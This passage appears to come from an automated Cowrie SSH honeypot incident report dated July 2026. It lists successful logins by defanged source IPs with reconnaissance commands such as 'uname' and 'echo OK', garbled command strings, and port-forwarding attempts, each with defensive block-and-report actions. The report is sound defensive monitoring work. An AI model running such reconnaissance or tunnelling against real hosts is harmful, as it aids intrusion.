| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:13:36` | `cowrie.session.connect` |
| `2026-07-15 04:13:36` | `cowrie.client.version` |
| `2026-07-15 04:13:36` | `cowrie.client.kex` |
| `2026-07-15 04:13:36` | `cowrie.login.success` |
| `2026-07-15 04:13:37` | `cowrie.session.params` |
| `2026-07-15 04:13:37` | `cowrie.command.input` |
| `2026-07-15 04:13:37` | `cowrie.log.closed` |
| `2026-07-15 04:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b21116fe13e

| Field | Detail |
|---|---|
| **Source IP** | `34.78.56[.]95` |
| **First Seen** | 2026-07-15 04:19 |
| **Last Seen** | 2026-07-15 04:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:19:32` | `cowrie.session.connect` |
| `2026-07-15 04:19:32` | `cowrie.client.version` |
| `2026-07-15 04:19:32` | `cowrie.client.kex` |
| `2026-07-15 04:19:34` | `cowrie.login.success` |
| `2026-07-15 04:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.56[.]95` to AbuseIPDB if not already reported
- [ ] Block `34.78.56[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15747dd6837

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 04:23 |
| **Last Seen** | 2026-07-15 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:23:25` | `cowrie.session.connect` |
| `2026-07-15 04:23:25` | `cowrie.client.version` |
| `2026-07-15 04:23:26` | `cowrie.client.kex` |
| `2026-07-15 04:23:26` | `cowrie.login.success` |
| `2026-07-15 04:23:27` | `cowrie.session.params` |
| `2026-07-15 04:23:27` | `cowrie.command.input` |
| `2026-07-15 04:23:27` | `cowrie.log.closed` |
| `2026-07-15 04:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f62b645116

| Field | Detail |
|---|---|
| **Source IP** | `220.246.41[.]171` |
| **First Seen** | 2026-07-15 04:23 |
| **Last Seen** | 2026-07-15 04:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:23:26` | `cowrie.session.connect` |
| `2026-07-15 04:23:27` | `cowrie.client.version` |
| `2026-07-15 04:23:27` | `cowrie.client.kex` |
| `2026-07-15 04:23:29` | `cowrie.login.success` |
| `2026-07-15 04:23:30` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.41[.]171` to AbuseIPDB if not already reported
- [ ] Block `220.246.41[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35da5c55513

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-07-15 04:26 |
| **Last Seen** | 2026-07-15 04:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:26:11` | `cowrie.session.connect` |
| `2026-07-15 04:26:12` | `cowrie.client.version` |
| `2026-07-15 04:26:12` | `cowrie.client.kex` |
| `2026-07-15 04:26:14` | `cowrie.login.success` |
| `2026-07-15 04:26:15` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3055b94c2d28

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-07-15 04:27 |
| **Last Seen** | 2026-07-15 04:32 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:27:08` | `cowrie.session.connect` |
| `2026-07-15 04:27:09` | `cowrie.client.version` |
| `2026-07-15 04:27:09` | `cowrie.client.kex` |
| `2026-07-15 04:27:10` | `cowrie.login.success` |
| `2026-07-15 04:27:10` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:32:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4778d57f55c6

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-07-15 04:27 |
| **Last Seen** | 2026-07-15 04:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:27:16` | `cowrie.session.connect` |
| `2026-07-15 04:27:17` | `cowrie.client.version` |
| `2026-07-15 04:27:17` | `cowrie.client.kex` |
| `2026-07-15 04:27:19` | `cowrie.login.success` |
| `2026-07-15 04:27:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9c7800fff5

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-07-15 04:27 |
| **Last Seen** | 2026-07-15 04:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:27:21` | `cowrie.session.connect` |
| `2026-07-15 04:27:22` | `cowrie.client.version` |
| `2026-07-15 04:27:22` | `cowrie.client.kex` |
| `2026-07-15 04:27:26` | `cowrie.login.success` |
| `2026-07-15 04:27:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b8ce107e53

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-15 04:27 |
| **Last Seen** | 2026-07-15 04:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:27:35` | `cowrie.session.connect` |
| `2026-07-15 04:27:36` | `cowrie.client.version` |
| `2026-07-15 04:27:36` | `cowrie.client.kex` |
| `2026-07-15 04:27:38` | `cowrie.login.success` |
| `2026-07-15 04:27:39` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5651c4a64b10

| Field | Detail |
|---|---|
| **Source IP** | `104.199.52[.]37` |
| **First Seen** | 2026-07-15 04:29 |
| **Last Seen** | 2026-07-15 04:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:29:25` | `cowrie.session.connect` |
| `2026-07-15 04:29:25` | `cowrie.login.success` |
| `2026-07-15 04:29:26` | `cowrie.session.params` |
| `2026-07-15 04:29:26` | `cowrie.command.input` |
| `2026-07-15 04:29:26` | `cowrie.command.input` |
| `2026-07-15 04:29:26` | `cowrie.command.failed` |
| `2026-07-15 04:29:26` | `cowrie.command.input` |
| `2026-07-15 04:29:26` | `cowrie.log.closed` |
| `2026-07-15 04:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.52[.]37` to AbuseIPDB if not already reported
- [ ] Block `104.199.52[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9facc6765194

| Field | Detail |
|---|---|
| **Source IP** | `104.199.52[.]37` |
| **First Seen** | 2026-07-15 04:29 |
| **Last Seen** | 2026-07-15 04:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:29:39` | `cowrie.session.connect` |
| `2026-07-15 04:29:39` | `cowrie.login.success` |
| `2026-07-15 04:29:39` | `cowrie.session.params` |
| `2026-07-15 04:29:39` | `cowrie.command.input` |
| `2026-07-15 04:29:39` | `cowrie.command.failed` |
| `2026-07-15 04:29:52` | `cowrie.log.closed` |
| `2026-07-15 04:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.52[.]37` to AbuseIPDB if not already reported
- [ ] Block `104.199.52[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a02901efdcee

| Field | Detail |
|---|---|
| **Source IP** | `104.199.52[.]37` |
| **First Seen** | 2026-07-15 04:29 |
| **Last Seen** | 2026-07-15 04:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:29:40` | `cowrie.session.connect` |
| `2026-07-15 04:29:40` | `cowrie.login.success` |
| `2026-07-15 04:29:41` | `cowrie.session.params` |
| `2026-07-15 04:29:41` | `cowrie.command.input` |
| `2026-07-15 04:29:52` | `cowrie.log.closed` |
| `2026-07-15 04:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.52[.]37` to AbuseIPDB if not already reported
- [ ] Block `104.199.52[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6179677e7e63

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:35 |
| **Last Seen** | 2026-07-15 04:36 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:35:27` | `cowrie.session.connect` |
| `2026-07-15 04:35:28` | `cowrie.login.success` |
| `2026-07-15 04:35:28` | `cowrie.session.params` |
| `2026-07-15 04:35:29` | `cowrie.command.input` |
| `2026-07-15 04:35:29` | `cowrie.command.failed` |
| `2026-07-15 04:35:29` | `cowrie.command.input` |
| `2026-07-15 04:35:29` | `cowrie.command.failed` |
| `2026-07-15 04:35:29` | `cowrie.command.input` |
| `2026-07-15 04:35:29` | `cowrie.command.failed` |
| `2026-07-15 04:35:30` | `cowrie.command.input` |
| `2026-07-15 04:35:30` | `cowrie.command.failed` |
| `2026-07-15 04:35:30` | `cowrie.command.input` |
| `2026-07-15 04:35:30` | `cowrie.command.input` |
| `2026-07-15 04:35:30` | `cowrie.command.failed` |
| `2026-07-15 04:35:30` | `cowrie.command.failed` |
| `2026-07-15 04:36:01` | `cowrie.log.closed` |
| `2026-07-15 04:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659f1f55c9d4

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:36 |
| **Last Seen** | 2026-07-15 04:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:36:01` | `cowrie.session.connect` |
| `2026-07-15 04:36:02` | `cowrie.login.success` |
| `2026-07-15 04:36:03` | `cowrie.session.params` |
| `2026-07-15 04:36:03` | `cowrie.command.input` |
| `2026-07-15 04:36:03` | `cowrie.command.failed` |
| `2026-07-15 04:36:03` | `cowrie.command.input` |
| `2026-07-15 04:36:03` | `cowrie.command.failed` |
| `2026-07-15 04:36:04` | `cowrie.command.input` |
| `2026-07-15 04:36:04` | `cowrie.command.failed` |
| `2026-07-15 04:36:04` | `cowrie.command.input` |
| `2026-07-15 04:36:04` | `cowrie.command.failed` |
| `2026-07-15 04:36:04` | `cowrie.command.input` |
| `2026-07-15 04:36:04` | `cowrie.command.input` |
| `2026-07-15 04:36:04` | `cowrie.command.failed` |
| `2026-07-15 04:36:04` | `cowrie.command.failed` |
| `2026-07-15 04:36:35` | `cowrie.log.closed` |
| `2026-07-15 04:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d579ac9e76

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:36 |
| **Last Seen** | 2026-07-15 04:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:36:35` | `cowrie.session.connect` |
| `2026-07-15 04:36:36` | `cowrie.login.success` |
| `2026-07-15 04:36:37` | `cowrie.session.params` |
| `2026-07-15 04:36:37` | `cowrie.command.input` |
| `2026-07-15 04:36:37` | `cowrie.command.failed` |
| `2026-07-15 04:36:38` | `cowrie.command.input` |
| `2026-07-15 04:36:38` | `cowrie.command.failed` |
| `2026-07-15 04:36:38` | `cowrie.command.input` |
| `2026-07-15 04:36:38` | `cowrie.command.failed` |
| `2026-07-15 04:36:38` | `cowrie.command.input` |
| `2026-07-15 04:36:38` | `cowrie.command.failed` |
| `2026-07-15 04:36:39` | `cowrie.command.input` |
| `2026-07-15 04:36:39` | `cowrie.command.input` |
| `2026-07-15 04:36:39` | `cowrie.command.failed` |
| `2026-07-15 04:36:39` | `cowrie.command.failed` |
| `2026-07-15 04:37:09` | `cowrie.log.closed` |
| `2026-07-15 04:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9db2a3e6516d

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:37 |
| **Last Seen** | 2026-07-15 04:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:37:09` | `cowrie.session.connect` |
| `2026-07-15 04:37:10` | `cowrie.login.success` |
| `2026-07-15 04:37:11` | `cowrie.login.success` |
| `2026-07-15 04:37:12` | `cowrie.session.params` |
| `2026-07-15 04:37:12` | `cowrie.command.input` |
| `2026-07-15 04:37:12` | `cowrie.command.failed` |
| `2026-07-15 04:37:12` | `cowrie.command.input` |
| `2026-07-15 04:37:12` | `cowrie.command.failed` |
| `2026-07-15 04:37:13` | `cowrie.command.input` |
| `2026-07-15 04:37:13` | `cowrie.command.input` |
| `2026-07-15 04:37:13` | `cowrie.command.failed` |
| `2026-07-15 04:37:13` | `cowrie.command.failed` |
| `2026-07-15 04:37:43` | `cowrie.log.closed` |
| `2026-07-15 04:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa2ea724ed6

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:37 |
| **Last Seen** | 2026-07-15 04:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:37:43` | `cowrie.session.connect` |
| `2026-07-15 04:37:44` | `cowrie.login.success` |
| `2026-07-15 04:37:45` | `cowrie.session.params` |
| `2026-07-15 04:37:45` | `cowrie.command.input` |
| `2026-07-15 04:37:45` | `cowrie.command.failed` |
| `2026-07-15 04:37:46` | `cowrie.command.input` |
| `2026-07-15 04:37:46` | `cowrie.command.failed` |
| `2026-07-15 04:37:46` | `cowrie.command.input` |
| `2026-07-15 04:37:46` | `cowrie.command.failed` |
| `2026-07-15 04:37:47` | `cowrie.command.input` |
| `2026-07-15 04:37:47` | `cowrie.command.failed` |
| `2026-07-15 04:37:47` | `cowrie.command.input` |
| `2026-07-15 04:37:47` | `cowrie.command.input` |
| `2026-07-15 04:37:47` | `cowrie.command.failed` |
| `2026-07-15 04:37:47` | `cowrie.command.failed` |
| `2026-07-15 04:38:17` | `cowrie.log.closed` |
| `2026-07-15 04:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5312f1848f3e

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:38 |
| **Last Seen** | 2026-07-15 04:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:38:17` | `cowrie.session.connect` |
| `2026-07-15 04:38:18` | `cowrie.login.success` |
| `2026-07-15 04:38:19` | `cowrie.session.params` |
| `2026-07-15 04:38:19` | `cowrie.command.input` |
| `2026-07-15 04:38:19` | `cowrie.command.failed` |
| `2026-07-15 04:38:20` | `cowrie.command.input` |
| `2026-07-15 04:38:20` | `cowrie.command.failed` |
| `2026-07-15 04:38:20` | `cowrie.command.input` |
| `2026-07-15 04:38:20` | `cowrie.command.failed` |
| `2026-07-15 04:38:20` | `cowrie.command.input` |
| `2026-07-15 04:38:20` | `cowrie.command.failed` |
| `2026-07-15 04:38:21` | `cowrie.command.input` |
| `2026-07-15 04:38:21` | `cowrie.command.input` |
| `2026-07-15 04:38:21` | `cowrie.command.failed` |
| `2026-07-15 04:38:21` | `cowrie.command.failed` |
| `2026-07-15 04:38:51` | `cowrie.log.closed` |
| `2026-07-15 04:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baa3d0c06c5c

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:38 |
| **Last Seen** | 2026-07-15 04:39 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:38:51` | `cowrie.session.connect` |
| `2026-07-15 04:38:52` | `cowrie.login.success` |
| `2026-07-15 04:38:53` | `cowrie.session.params` |
| `2026-07-15 04:38:53` | `cowrie.command.input` |
| `2026-07-15 04:38:53` | `cowrie.command.failed` |
| `2026-07-15 04:38:54` | `cowrie.command.input` |
| `2026-07-15 04:38:54` | `cowrie.command.failed` |
| `2026-07-15 04:38:54` | `cowrie.command.input` |
| `2026-07-15 04:38:54` | `cowrie.command.failed` |
| `2026-07-15 04:38:55` | `cowrie.command.input` |
| `2026-07-15 04:38:55` | `cowrie.command.failed` |
| `2026-07-15 04:38:55` | `cowrie.command.input` |
| `2026-07-15 04:38:55` | `cowrie.command.input` |
| `2026-07-15 04:38:55` | `cowrie.command.failed` |
| `2026-07-15 04:38:55` | `cowrie.command.failed` |
| `2026-07-15 04:39:25` | `cowrie.log.closed` |
| `2026-07-15 04:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae4e3c69879f

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:39 |
| **Last Seen** | 2026-07-15 04:39 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:39:25` | `cowrie.session.connect` |
| `2026-07-15 04:39:26` | `cowrie.login.success` |
| `2026-07-15 04:39:27` | `cowrie.session.params` |
| `2026-07-15 04:39:27` | `cowrie.command.input` |
| `2026-07-15 04:39:27` | `cowrie.command.failed` |
| `2026-07-15 04:39:28` | `cowrie.command.input` |
| `2026-07-15 04:39:28` | `cowrie.command.failed` |
| `2026-07-15 04:39:28` | `cowrie.command.input` |
| `2026-07-15 04:39:28` | `cowrie.command.failed` |
| `2026-07-15 04:39:29` | `cowrie.command.input` |
| `2026-07-15 04:39:29` | `cowrie.command.failed` |
| `2026-07-15 04:39:29` | `cowrie.command.input` |
| `2026-07-15 04:39:29` | `cowrie.command.input` |
| `2026-07-15 04:39:29` | `cowrie.command.failed` |
| `2026-07-15 04:39:29` | `cowrie.command.failed` |
| `2026-07-15 04:39:59` | `cowrie.log.closed` |
| `2026-07-15 04:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b17681f72b

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:39 |
| **Last Seen** | 2026-07-15 04:40 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:39:59` | `cowrie.session.connect` |
| `2026-07-15 04:40:00` | `cowrie.login.success` |
| `2026-07-15 04:40:01` | `cowrie.session.params` |
| `2026-07-15 04:40:01` | `cowrie.command.input` |
| `2026-07-15 04:40:01` | `cowrie.command.failed` |
| `2026-07-15 04:40:02` | `cowrie.command.input` |
| `2026-07-15 04:40:02` | `cowrie.command.failed` |
| `2026-07-15 04:40:02` | `cowrie.command.input` |
| `2026-07-15 04:40:02` | `cowrie.command.failed` |
| `2026-07-15 04:40:02` | `cowrie.command.input` |
| `2026-07-15 04:40:02` | `cowrie.command.failed` |
| `2026-07-15 04:40:03` | `cowrie.command.input` |
| `2026-07-15 04:40:03` | `cowrie.command.input` |
| `2026-07-15 04:40:03` | `cowrie.command.failed` |
| `2026-07-15 04:40:03` | `cowrie.command.failed` |
| `2026-07-15 04:40:33` | `cowrie.log.closed` |
| `2026-07-15 04:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd89b6932e53

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 04:40 |
| **Last Seen** | 2026-07-15 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:40:31` | `cowrie.session.connect` |
| `2026-07-15 04:40:31` | `cowrie.client.version` |
| `2026-07-15 04:40:31` | `cowrie.client.kex` |
| `2026-07-15 04:40:31` | `cowrie.login.success` |
| `2026-07-15 04:40:32` | `cowrie.session.params` |
| `2026-07-15 04:40:32` | `cowrie.command.input` |
| `2026-07-15 04:40:32` | `cowrie.log.closed` |
| `2026-07-15 04:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64a6904263e

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-15 04:40 |
